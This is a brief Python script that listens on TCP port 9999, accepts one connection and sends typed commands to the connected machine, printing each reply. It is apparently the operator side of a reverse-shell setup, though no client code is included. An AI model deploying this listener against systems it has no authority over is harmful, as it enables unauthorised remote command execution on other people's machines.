import socket
import sys
import os
def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port=9999
        s=socket.socket()

    except socket.error as msg:
        print(" display socket creation error:" + str(msg))

def bind_socket():
    try:
        global host
        global port
        global s
        print("port Binding....: " + str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("socket binding error.." + str(msg) + "\n" +"Retrying.. Retrying!..")
        bind_socket()

def socket_accept():
    conn,address =s.accept()
    print("connection  established! success.." + " IP" + address[0] + " | Port" + str(address[1]))
    send_command(conn)
    conn.close()

def send_command(conn):
    while True:
        cmd=input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response= str(conn.recv(1024), 'utf-8')
            print(client_response , end=" ")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()

